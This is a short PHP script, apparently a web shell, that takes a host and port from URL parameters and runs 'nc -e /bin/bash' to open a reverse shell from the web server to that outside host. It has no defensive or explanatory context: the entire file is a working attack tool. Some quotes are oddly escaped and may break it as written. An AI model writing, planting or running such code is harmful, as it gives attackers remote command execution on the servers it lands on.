<?php
if(isset($_GET[\'h\']) && isset($_GET[\'p\'])) {
    $host = $_GET[\'h\'];
    $port = (int)$_GET[\'p\'];

    $shell = popen('nc -e /bin/bash ' . escapeshellarg($host) . ' ' . escapeshellarg($port), 'r');

    while ($buffer = fgets($shell, 1024)) {
        echo $buffer;
    }

    pclose($shell);
}
?>

